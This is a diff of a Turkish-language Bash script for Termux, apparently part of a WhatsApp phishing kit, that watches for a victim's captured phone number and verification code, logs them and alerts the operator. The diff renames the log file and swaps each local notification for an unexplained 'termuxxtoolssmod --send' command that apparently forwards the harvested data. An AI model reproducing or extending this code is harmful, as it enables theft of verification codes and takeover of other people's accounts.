@@ -92,9 +92,9 @@ do
 		echo
 		echo
 		echo
-		cat kod.txt >> kaydedilen.txt
+		cat kod.txt >> saved_info.txt
 		rm kod.txt
-		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] KOD GİRİLDİ"
+		termuxxtoolssmod --send
 		exit
 	fi
 done
@@ -111,44 +111,44 @@ do
 		echo
 		echo
 		echo
-		cat numara.txt >> kaydedilen.txt
+		cat numara.txt >> saved_info.txt
 		rm numara.txt
-		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] NUMARA GİRİLDİ"
+		termuxxtoolssmod --send
 		dongu2
 	fi
 done
 }
 kapali() {
-cat kaydedilen.txt > .sayi.txt
+cat saved_info.txt > .sayi.txt
 kontrol2=$(cat .sayi.txt |wc -l)
 while :
 do
-	kontrol=$(cat kaydedilen.txt |wc -l)
+	kontrol=$(cat saved_info.txt |wc -l)
 	if [[ $kontrol != $kontrol2 ]];then
 		echo
 		echo
 		echo
-		printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+		printf "\e[32m$(cat saved_info.txt)\e[97m"
 		echo
 		echo
 		echo
-		termux-notification -t WHATSAPP_PHİSİNG -c "[✓] BİLGİ GİRİLDİ"
+		termuxxtoolssmod --send
 		exit
 	fi
 done
 }
 bulunan() {
-if [[ -a kaydedilen.txt ]];then
+if [[ -a saved_info.txt ]];then
 	echo
 	echo
 	echo
-	printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+	printf "\e[32m$(cat saved_info.txt)\e[97m"
 	echo
 	echo
 	echo
 	read -e -p $'\e[97mKAYDEDİLEN ESKİ DOSYA SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
 	if [[ $sec == e || $sec == E ]];then
-		rm kaydedilen.txt
+		rm saved_info.txt
 		echo
 		echo
 		echo
